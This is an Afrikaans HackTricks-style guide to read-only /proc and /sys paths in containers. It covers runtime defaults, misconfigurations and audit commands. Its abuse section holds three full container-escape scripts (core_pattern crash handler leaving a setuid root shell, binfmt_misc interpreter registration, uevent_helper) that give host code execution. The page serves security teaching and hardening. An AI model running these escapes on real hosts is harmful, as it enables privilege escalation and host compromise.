# Slegs-lees stelselpade

{{#include ../../../../banners/hacktricks-training.md}}

Slegs-lees stelselpade is 'n aparte beskerming, anders as gemaskerde paaie. In plaas daarvan om 'n pad heeltemal te verberg, openbaar die runtime dit maar monteer dit as slegs-lees. Dit is algemeen vir sekere procfs- en sysfs-lokasies waar lees-toegang aanvaarbaar of operasioneel nodig kan wees, maar skryftoegang te gevaarlik sou wees.

Die doel is eenvoudig: baie kernel-koppelvlakke word baie gevaarliker as hulle skryfbaar is. 'n Slegs-lees mount verwyder nie alle verkenningswaarde nie, maar dit voorkom dat 'n gekompromitteerde workload die onderliggende lêers wat aan die kernel blootgestel is, via daardie pad wysig.

## Werking

Runtimes merk dikwels dele van die proc/sys-uitsig as slegs-lees. Afhangend van die runtime en gasheer, kan dit paaie insluit soos:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Die werklike lys wissel, maar die model is dieselfde: laat sigbaarheid toe waar nodig, weier veranderinge standaard.

## Laboratorium

Inspekteer die deur Docker gedeclareerde lys van slegs-lees paaie:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Inspekteer die gemonteerde proc/sys-aansig van binne die container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Sekuriteitsinvloed

Read-only system paths beperk 'n groot klas misbruik wat die host raak. Selfs wanneer 'n aanvaller procfs of sysfs kan inspekteer, maak die onvermoë om daar te skryf baie direkte wysigingspade onbruikbaar — insluitend dié wat kernel tunables, crash handlers, module-loading helpers of ander control interfaces betrek. Die blootstelling verdwyn nie, maar die oorgang van information disclosure na invloed oor die host word moeiliker.

## Miskonfigurasies

Die hooffoute is om sensitiewe paaie te unmask of te remount as read-write, om host proc/sys inhoud direk bloot te stel met writable bind mounts, of om privileged modes te gebruik wat effektief die veiliger runtime defaults omseil. In Kubernetes, `procMount: Unmasked` en privileged workloads gaan dikwels saam met swakere proc-beskerming. 'n Ander algemene operasionele fout is om aan te neem dat omdat die runtime gewoonlik hierdie paaie read-only moun, alle workloads steeds daardie default erf.

## Misbruik

As die beskerming swak is, begin deur te kyk na writable proc/sys entries:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Wanneer skryfbare inskrywings teenwoordig is, sluit opvolgpaaie van hoë waarde in:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Wat hierdie opdragte kan openbaar:

- Skryfbare inskrywings onder `/proc/sys` beteken dikwels dat die container die host kernel-gedrag kan wysig in plaas van dit slegs te inspekteer.
- `core_pattern` is veral belangrik omdat 'n skryfbare host-facing waarde omgeskakel kan word in 'n host code-execution path deur 'n proses te laat crash nadat 'n pipe handler gestel is.
- `modprobe` onthul die helper wat deur die kernel gebruik word vir module-loading verwante vloei; dit is 'n klassieke hoë-waarde teiken wanneer dit skryfbaar is.
- `binfmt_misc` vertel jou of custom interpreter registrasie moontlik is. As registrasie skryfbaar is, kan dit 'n execution primitive word in plaas van net 'n information leak.
- `panic_on_oom` beheer 'n host-wyde kernel-besluit en kan daarom resource exhaustion in 'n host denial of service omskakel.
- `uevent_helper` is een van die duidelikste voorbeelde van 'n skryfbare sysfs helper-pad wat host-context uitvoering kan produseer.

Interessante bevindings sluit in skryfbare host-facing proc knobs of sysfs entries wat normaalweg lees-alleen moes wees. Op daardie punt het die workload verschuif van 'n beperkte container-uitsig na beduidende kernel-invloed.

### Volledige Voorbeeld: `core_pattern` Host Escape

If `/proc/sys/kernel/core_pattern` is writable from inside the container and points to the host kernel view, it can be abused to execute a payload after a crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
As die pad inderdaad die gasheerkern bereik, word die payload op die gasheer uitgevoer en laat dit 'n setuid-shell agter.

### Volledige voorbeeld: `binfmt_misc` Registrasie

As `/proc/sys/fs/binfmt_misc/register` skryfbaar is, kan 'n aangepaste interpreter-registrasie kode-uitvoering produseer wanneer die ooreenstemmende lêer uitgevoer word:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
On a host-facing writable `binfmt_misc`, is die resultaat kode-uitvoering in die deur die kernel geaktiveerde interpreterpad.

### Volledige voorbeeld: `uevent_helper`

As `/sys/kernel/uevent_helper` skryfbaar is, kan die kernel 'n host-path helper aanroep wanneer 'n ooreenstemmende gebeurtenis geaktiveer word:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Die rede waarom dit so gevaarlik is, is dat die helper-pad vanuit die host-lêerstelsel se perspektief opgelos word, en nie vanuit 'n veilige, slegs-kontainer-konteks nie.

## Kontroles

Hierdie kontroles bepaal of die procfs/sysfs-blootstelling op die verwagte plekke slegs-leesbaar is en of die werkbelasting steeds sensitiewe kernel-koppelvlakke kan wysig.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Wat hier interessant is:

- ’n Normale geharde werkbelasting behoort baie min skryfbare /proc/sys-inskrywings bloot te stel.
- Skryfbare `/proc/sys`-paaie is dikwels belangriker as gewone lees-toegang.
- As die runtime sê ’n paadjie is read-only maar dit is in die praktyk skryfbaar, hersien mount-propagasie, bind mounts en privilege-instellings noukeurig.

## Runtime-standaarde

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Ingeskakel by verstek | Docker definieer ’n standaard lys van read-only-paaie vir sensitiewe proc-inskrywings | blootstelling van host proc/sys mounts, `--privileged` |
| Podman | Ingeskakel by verstek | Podman pas standaard read-only-paaie toe tensy dit uitdruklik verslap word | `--security-opt unmask=ALL`, breë host mounts, `--privileged` |
| Kubernetes | Erf runtime-standaarde | Gebruik die onderliggende runtime se read-only-paaimodel tensy dit verswak word deur Pod-instellings of host mounts | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Runtime verstek | Gewoonlik staatgemaak op OCI/runtime-verstekke | soos die Kubernetes-ry; direkte runtime-konfigurasiewijzigings kan die gedrag verswak |

Die kernpunt is dat read-only stelselpaaie gewoonlik as ’n runtime-verstek teenwoordig is, maar dit is maklik om dit te ondermyn met privileged-modi of host bind mounts.
{{#include ../../../../banners/hacktricks-training.md}}
